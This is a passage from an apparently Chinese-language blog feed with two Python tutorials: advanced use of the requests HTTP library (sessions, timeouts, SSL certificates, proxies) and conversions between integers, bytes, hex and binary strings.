class="string">&#x27;http://github.com&#x27;</span>, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">r.url</span><br><span class="line"><span class="comment">#out&gt; &#x27;https://github.com/&#x27;</span></span><br><span class="line">r.history</span><br><span class="line"><span class="comment">#out&gt; [&lt;Response [301]&gt;]</span></span><br></pre></td></tr></table></figure><h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><p>requests在经过timeout秒数后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，可能会永远失去响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">requests.get(<span class="string">&#x27;http://github.com&#x27;</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line"><span class="comment">#out&gt;</span></span><br><span class="line"><span class="comment">#Traceback (most recent call last):</span></span><br><span class="line"><span class="comment">#  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span></span><br><span class="line"><span class="comment">#requests.exceptions.Timeout: HTTPConnectionPool(host=&#x27;github.com&#x27;, port=80): Request timed out. (timeout=0.001)</span></span><br></pre></td></tr></table></figure><div class="note warning flat"><p>timeout仅对连接过程有效，与响应体的下载无关。timeout并不是整个下载响应的时间限制，而是如果服务器在timeout秒内没有应答，将会引发一个异常（更精确地说，是在timeout秒内没有从基础套接字上接收到任何字节的数据时）。</p></div><h2 id="错误与异常"><a href="#错误与异常" class="headerlink" title="错误与异常"></a>错误与异常</h2><ul><li>遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个<code>ConnectionError</code>异常。</li><li>如果HTTP请求返回了不成功的状态码，<code>Response.raise_for_status()</code>会抛出一个<code>HTTPError</code>异常。</li><li>若请求超时，则抛出一个<code>Timeout</code>异常。</li><li>若请求超过了设定的最大重定向次数，则会抛出一个<code>TooManyRedirects</code>异常。</li><li>所有Requests显式抛出的异常都继承自<code>requests.exceptions.RequestException</code>。</li></ul><h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><h2 id="会话对象Session"><a href="#会话对象Session" class="headerlink" title="会话对象Session"></a>会话对象Session</h2><p>会话对象Session能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookie，底层使用urllib3的connection pooling功能。如果向同一主机发送多个请求，底层的TCP连接将会被重用，从而带来显著的性能提升。</p><p>会话对象具有主要的Requests API的所有方法。</p><p>跨请求保持一些 cookie:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">s.get(<span class="string">&#x27;http://httpbin.org/cookies/set/sessioncookie/123456789&#x27;</span>)</span><br><span class="line">r = s.get(<span class="string">&quot;http://httpbin.org/cookies&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment">#out&gt; &#x27;&#123;&quot;cookies&quot;: &#123;&quot;sessioncookie&quot;: &quot;123456789&quot;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>会话也可用来为请求方法提供缺省数据。这是通过为会话对象的属性提供数据来实现的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">s.auth = (<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>)</span><br><span class="line">s.headers.update(&#123;<span class="string">&#x27;x-test&#x27;</span>: <span class="string">&#x27;true&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># both &#x27;x-test&#x27; and &#x27;x-test2&#x27; are sent</span></span><br><span class="line">s.get(<span class="string">&#x27;http://httpbin.org/headers&#x27;</span>, headers=&#123;<span class="string">&#x27;x-test2&#x27;</span>: <span class="string">&#x27;true&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>任何传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。</p><p>不过需要注意，就算使用了会话，方法级别的参数也不会被跨请求保持。下面的例子只会和第一个请求发送 cookie ，而非第二个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>, cookies=&#123;<span class="string">&#x27;from-my&#x27;</span>: <span class="string">&#x27;browser&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment">#out&gt; &#x27;&#123;&quot;cookies&quot;: &#123;&quot;from-my&quot;: &quot;browser&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = s.get(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment">#out&gt; &#x27;&#123;&quot;cookies&quot;: &#123;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>如果你要手动为会话添加cookie，就使用Cookie utility函数来操纵Session.cookies。</p><p>会话还可以用作前后文管理器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">    s.get(<span class="string">&#x27;http://httpbin.org/cookies/set/sessioncookie/123456789&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样就能确保 with 区块退出后会话能被关闭，即使发生了异常也一样。</p><h2 id="从字典参数中移除一个值"><a href="#从字典参数中移除一个值" class="headerlink" title="从字典参数中移除一个值"></a>从字典参数中移除一个值</h2><p>有时会想省略字典参数中一些会话层的键。要做到这一点，只需简单地在方法层参数中将那个键的值设置为<code>None</code>，那个键就会被自动省略掉。</p><h2 id="请求与响应对象"><a href="#请求与响应对象" class="headerlink" title="请求与响应对象"></a>请求与响应对象</h2><p>任何时候进行了类似requests.get()的调用，你都在做两件主要的事情。其一，你在构建一个Request对象，该对象将被发送到某个服务器请求或查询一些资源。其二，一旦requests得到一个从服务器返回的响应就会产生一个Response对象。该响应对象包含服务器返回的所有信息，也包含你原来创建的Request对象。如下是一个简单的请求，从Wikipedia的服务器得到一些非常重要的信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&#x27;http://en.wikipedia.org/wiki/Monty_Python&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果想访问服务器返回给我们的响应头部信息，可以这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.headers</span><br><span class="line"><span class="comment">#out&gt; &#123;&#x27;content-length&#x27;: &#x27;56170&#x27;, &#x27;x-content-type-options&#x27;: &#x27;nosniff&#x27;, &#x27;x-cache&#x27;:&#x27;HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet&#x27;, &#x27;content-encoding&#x27;: &#x27;gzip&#x27;, &#x27;age&#x27;: &#x27;3080&#x27;, &#x27;content-language&#x27;: &#x27;en&#x27;, &#x27;vary&#x27;: &#x27;Accept-Encoding,Cookie&#x27;,&#x27;server&#x27;: &#x27;Apache&#x27;, &#x27;last-modified&#x27;: &#x27;Wed, 13 Jun 2012 01:33:50 GMT&#x27;, &#x27;connection&#x27;: &#x27;close&#x27;, &#x27;cache-control&#x27;: &#x27;private, s-maxage=0, max-age=0, must-revalidate&#x27;, &#x27;date&#x27;: &#x27;Thu, 14 Jun 2012 12:59:39 GMT&#x27;, &#x27;content-type&#x27;: &#x27;text/html; charset=UTF-8&#x27;, &#x27;x-cache-lookup&#x27;: &#x27;HIT from cp1006.eqiad.wmnet:3128, MISS from cp1010.eqiad.wmnet:80&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.request.headers</span><br><span class="line"><span class="comment">#out&gt; &#123;&#x27;Accept-Encoding&#x27;: &#x27;identity, deflate, compress, gzip&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;User-Agent&#x27;: &#x27;python-requests/0.13.1&#x27;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Prepared-Request"><a href="#Prepared-Request" class="headerlink" title="Prepared Request"></a>Prepared Request</h2><p>当你从API或者会话调用中收到一个Response对象时，request属性其实是使用了PreparedRequest。有时在发送请求之前，你需要对body或header（或者别的什么东西）做一些额外处理，下面演示了一个简单的做法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"></span><br><span class="line">s = Session()</span><br><span class="line">req = Request(<span class="string">&#x27;GET&#x27;</span>, url,</span><br><span class="line">    data=data,</span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line">prepped = req.prepare()</span><br><span class="line"><span class="comment"># Request.prepare()会失去Session对象的一些优势，尤其Session级别的状态，例如cookie就不会被应用到你的请求上去。要获取一个带有状态的PreparedRequest，请用Session.prepare_request():</span></span><br><span class="line"><span class="comment"># prepped = s.prepare_request(req)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># do something with prepped.body</span></span><br><span class="line"><span class="comment"># do something with prepped.headers</span></span><br><span class="line"></span><br><span class="line">resp = s.send(prepped,</span><br><span class="line">    stream=stream,</span><br><span class="line">    verify=verify,</span><br><span class="line">    proxies=proxies,</span><br><span class="line">    cert=cert,</span><br><span class="line">    timeout=timeout</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.status_code)</span><br></pre></td></tr></table></figure><p>由于你没有对Request对象做什么特殊事情，你立即准备和修改了PreparedRequest对象，然后把它和别的参数一起发送到requests.<em>或者Session.</em>。</p><h2 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h2><p>SSL验证默认是开启的，如果证书验证失败，Requests会抛出<code>SSLError</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests.get(<span class="string">&#x27;https://requestb.in&#x27;</span>)</span><br><span class="line"><span class="comment">#out&gt; requests.exceptions.SSLError: hostname &#x27;requestb.in&#x27; doesn&#x27;t match either of &#x27;*.herokuapp.com&#x27;, &#x27;herokuapp.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在该域名上我没有设置 SSL，所以失败了。但 Github 设置了 SSL:</span></span><br><span class="line">requests.get(<span class="string">&#x27;https://github.com&#x27;</span>, verify=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#out&gt; &lt;Response [200]&gt;</span></span><br></pre></td></tr></table></figure><p>你可以为verify传入CA_BUNDLE文件的路径，或者包含可信任CA证书文件的文件夹路径：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">requests.get(<span class="string">&#x27;https://github.com&#x27;</span>, verify=<span class="string">&#x27;/path/to/certfile&#x27;</span>)</span><br><span class="line"><span class="comment"># 或者将其保持在会话中：</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.verify = <span class="string">&#x27;/path/to/certfile&#x27;</span></span><br><span class="line"><span class="comment"># 如果 verify 设为文件夹路径，文件夹必须通过 OpenSSL 提供的 c_rehash 工具处理。</span></span><br></pre></td></tr></table></figure><p>还可以通过 REQUESTS_CA_BUNDLE 环境变量定义可信任 CA 列表。</p><p>忽略对SSL证书的验证:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">requests.get(<span class="string">&#x27;https://kennethreitz.org&#x27;</span>, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#out&gt; &lt;Response [200]&gt;</span></span><br></pre></td></tr></table></figure><h2 id="客户端证书"><a href="#客户端证书" class="headerlink" title="客户端证书"></a>客户端证书</h2><p>指定一个本地证书用作客户端证书，可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">requests.get(<span class="string">&#x27;https://kennethreitz.org&#x27;</span>, cert=(<span class="string">&#x27;/path/client.cert&#x27;</span>, <span class="string">&#x27;/path/client.key&#x27;</span>))</span><br><span class="line"><span class="comment">#out&gt; &lt;Response [200]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者保持在会话中：</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.cert = <span class="string">&#x27;/path/client.cert&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果指定了一个错误路径或一个无效的证书:</span></span><br><span class="line">requests.get(<span class="string">&#x27;https://kennethreitz.org&#x27;</span>, cert=<span class="string">&#x27;/wrong_path/client.pem&#x27;</span>)</span><br><span class="line"><span class="comment">#out&gt; SSLError: [Errno 336265225] _ssl.c:347: error:140B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib</span></span><br></pre></td></tr></table></figure><div class="note warning flat"><p>本地证书的私有 key 必须是解密状态。目前，Requests 不支持使用加密的 key。</p></div><h2 id="CA证书"><a href="#CA证书" class="headerlink" title="CA证书"></a>CA证书</h2><p>Requests默认附带了一套它信任的根证书，来自于Mozilla trust store。然而它们在每次Requests更新时才会更新。这意味着如果你固定使用某一版本的Requests，你的证书有可能已经太旧了。<br>从Requests 2.4.0版之后，如果系统中装了certifi包，Requests会试图使用它里边的证书。这样用户就可以在不修改代码的情况下更新他们的可信任证书。<br>安全起见，建议你经常更新 certifi！</p><h2 id="流式上传"><a href="#流式上传" class="headerlink" title="流式上传"></a>流式上传</h2><p>Requests支持流式上传，这允许你发送大的数据流或文件而无需先把它们读入内存。要使用流式上传，仅需为你的请求体提供一个类文件对象即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;massive-body&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    requests.post(<span class="string">&#x27;http://some.url/streamed&#x27;</span>, data=f)</span><br></pre></td></tr></table></figure><p>强烈建议用二进制模式打开文件。</p><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>如果需要使用代理，你可以通过为任意请求方法提供<code>proxies</code>参数来配置单个请求:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://10.10.1.10:3128&quot;</span>,</span><br><span class="line">  <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://10.10.1.10:1080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&quot;http://example.org&quot;</span>, proxies=proxies)</span><br></pre></td></tr></table></figure><p>也可以通过环境变量<code>HTTP_PROXY</code>和<code>HTTPS_PROXY</code>来配置代理。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HTTP_PROXY=<span class="string">&quot;http://10.10.1.10:3128&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTPS_PROXY=<span class="string">&quot;http://10.10.1.10:1080&quot;</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line">&gt;&gt;&gt; requests.get(<span class="string">&quot;http://example.org&quot;</span>)</span><br></pre></td></tr></table></figure><p>若你的代理需要使用HTTP Basic Auth，可以使用<code>http://user:password@host/</code>语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://user:pass@10.10.1.10:3128/&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要为某个特定的连接方式或者主机设置代理，使用<code>scheme://hostname</code>作为key， 它会针对指定的主机和连接方式进行匹配。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;<span class="string">&#x27;http://10.20.1.128&#x27;</span>: <span class="string">&#x27;http://10.10.1.10:5323&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>代理URL必须包含连接方式。</p></div><p>SOCKS代理（2.10.0 新版功能）<br>除了基本的HTTP代理，Requests还支持SOCKS协议的代理。这是一个可选功能，若要使用，需要安装第三方库。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests[socks]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://user:pass@host:port&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://user:pass@host:port&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更多高级用法参照<a href="https://docs.python-requests.org/zh_CN/latest/">requests官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> http请求库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3字节&amp;进制转换</title>
      <link href="/2021/06/03/Tools/py3format/"/>
      <url>/2021/06/03/Tools/py3format/</url>
      
        <content type="html"><![CDATA[<h1 id="使用struct"><a href="#使用struct" class="headerlink" title="使用struct"></a>使用struct</h1><blockquote><p>参考<a href="https://docs.python.org/zh-cn/3/library/struct.html">python doc</a></p></blockquote><p>该模块用于Python字节对象和C结构之间进行转换。</p><p><code>struct.pack(format, v1, v2, ...)</code>：返回一个<code>bytes</code>对象，其中包含根据格式字符串format打包的值v1, v2, … 参数个数必须与格式字符串所要求的值完全匹配。</p><p><code>struct.unpack(format, buffer)</code>：根据格式字符串<code>format</code>从<code>buffer</code>解包（假定是由<code>pack(format, ...)</code>打包）。结果为一个<code>tuple</code>，即使其只包含一个条目。<code>buffer</code>的字节大小必须匹配格式所要求的大小，即 <code>struct.calcsize(format)</code>。</p><p><a href="https://docs.python.org/zh-cn/3/library/struct.html#byte-order-size-and-alignment">字节顺序、大小和对齐方式</a></p><p><a href="https://docs.python.org/zh-cn/3/library/struct.html#format-characters">format格式字符</a></p><h1 id="使用pycryptodome"><a href="#使用pycryptodome" class="headerlink" title="使用pycryptodome"></a>使用pycryptodome</h1><p>安装<code>pycryptodome</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><ul><li><code>Crypto.Util.number.long_to_bytes(n, blocksize=0)</code>: int转bytes（大端序），如果<code>blocksize</code>不为0，则按指定位宽填充</li><li><code>Crypto.Util.number.bytes_to_long(s)</code>: bytes转int（大端序）</li></ul><div class="note info simple"><p>如未做特别说明，以下<code>int</code>均指无符号整数</p></div><h1 id="int-bytes"><a href="#int-bytes" class="headerlink" title="int -&gt; bytes"></a>int -&gt; bytes</h1><h2 id="hex中转"><a href="#hex中转" class="headerlink" title="hex中转"></a>hex中转</h2><p>适用任意大小的int</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dec = <span class="number">123456</span></span><br><span class="line">hexstr = <span class="built_in">hex</span>(dec)[<span class="number">2</span>:] <span class="comment"># 去掉前导0x标记</span></span><br><span class="line">byte = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;0&#x27;</span> + hexstr <span class="keyword">if</span> <span class="built_in">len</span>(hexstr)%<span class="number">2</span> <span class="keyword">else</span> hexstr) <span class="comment"># 确保hexstr长度是偶数</span></span><br><span class="line">byte <span class="comment">#&gt; b&#x27;\x01\xe2@&#x27; 大端序</span></span><br><span class="line">byte[::-<span class="number">1</span>] <span class="comment">#&gt; b&#x27;@\xe2\x01&#x27; 小端序</span></span><br></pre></td></tr></table></figure><h2 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h2><p>适用任意大小的int</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">dec = <span class="number">123456</span></span><br><span class="line">byte = long_to_bytes(dec)</span><br><span class="line">byte <span class="comment">#&gt; b&#x27;\x01\xe2@&#x27; 大端序</span></span><br></pre></td></tr></table></figure><h2 id="int-to-bytes"><a href="#int-to-bytes" class="headerlink" title="int.to_bytes"></a>int.to_bytes</h2><p>需要指定输出位宽，支持signed int（补码）</p><blockquote><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#int.to_bytes">参考python doc</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dec = <span class="number">123456</span></span><br><span class="line">byte = dec.to_bytes(<span class="number">3</span>, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">byte <span class="comment">#&gt; b&#x27;\x01\xe2@&#x27; 大端序</span></span><br></pre></td></tr></table></figure><h2 id="struct-pack"><a href="#struct-pack" class="headerlink" title="struct.pack"></a>struct.pack</h2><p><code>format</code>本质上指定了输出位宽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">dec = <span class="number">123456</span></span><br><span class="line">struct.pack(<span class="string">&quot;&gt;I&quot;</span>, dec) <span class="comment">#&gt; b&#x27;\x00\x01\xe2@&#x27; 大端序</span></span><br><span class="line">struct.pack(<span class="string">&quot;&lt;I&quot;</span>, dec) <span class="comment">#&gt; b&#x27;@\xe2\x01\x00&#x27; 小端序</span></span><br></pre></td></tr></table></figure><h1 id="bytes-int"><a href="#bytes-int" class="headerlink" title="bytes -&gt; int"></a>bytes -&gt; int</h1><h2 id="int-from-bytes"><a href="#int-from-bytes" class="headerlink" title="int.from_bytes"></a>int.from_bytes</h2><blockquote><p><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#int.from_bytes">参考python doc</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;\x05\x94\xfd3\xc6\xd1&#x27;</span>, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>) <span class="comment">#&gt; 6137461327569</span></span><br><span class="line"><span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;\x05\x94\xfd3\xc6\xd1&#x27;</span>, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="comment">#&gt; 230649205986309</span></span><br></pre></td></tr></table></figure><h2 id="pycryptodome-1"><a href="#pycryptodome-1" class="headerlink" title="pycryptodome"></a>pycryptodome</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">bytes_to_long(<span class="string">b&#x27;\x01\xe2@&#x27;</span>) <span class="comment">#&gt; 123456 大端序</span></span><br></pre></td></tr></table></figure><h2 id="struct-unpack"><a href="#struct-unpack" class="headerlink" title="struct.unpack"></a>struct.unpack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, <span class="string">b&#x27;\x00\x01\xe2@&#x27;</span>)[<span class="number">0</span>] <span class="comment">#&gt; 1088553216</span></span><br><span class="line">struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, <span class="string">b&#x27;\x00\x01\xe2@&#x27;</span>)[<span class="number">0</span>] <span class="comment">#&gt; 123456</span></span><br></pre></td></tr></table></figure><h1 id="使用str-format"><a href="#使用str-format" class="headerlink" title="使用str.format"></a>使用str.format</h1><ul><li><a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str.format">str.format方法</a></li><li><a href="https://docs.python.org/zh-cn/3/library/string.html#format-string-syntax">格式化字符串语法</a></li><li><a href="https://docs.python.org/zh-cn/3/library/string.html#format-specification-mini-language">格式规格迷你语言</a></li><li><a href="https://docs.python.org/zh-cn/3/library/string.html#format-examples">格式示例</a></li></ul><h1 id="int-hex-string"><a href="#int-hex-string" class="headerlink" title="int -&gt; hex_string"></a>int -&gt; hex_string</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>(<span class="number">123456</span>) <span class="comment">#&gt; &#x27;0x1e240&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">123456</span>) <span class="comment">#&gt; &#x27;1e240&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="hex-string-int"><a href="#hex-string-int" class="headerlink" title="hex_string -&gt; int"></a>hex_string -&gt; int</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;1e240&#x27;</span>,<span class="number">16</span>) <span class="comment">#&gt; 123456</span></span><br><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0x1e240&#x27;</span>,<span class="number">16</span>) <span class="comment">#&gt; 123456</span></span><br></pre></td></tr></table></figure><h1 id="int-bin-string"><a href="#int-bin-string" class="headerlink" title="int -&gt; bin_string"></a>int -&gt; bin_string</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bin</span>(<span class="number">7</span>) <span class="comment">#&gt; &#x27;0b111&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;:b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">7</span>) <span class="comment">#&gt; &#x27;111&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="bin-string-int"><a href="#bin-string-int" class="headerlink" title="bin_string -&gt; int"></a>bin_string -&gt; int</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;111&#x27;</span>, <span class="number">2</span>) <span class="comment">#&gt; 7</span></span><br><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0b111&#x27;</span>, <span class="number">2</span>) <span class="comment">#&gt; 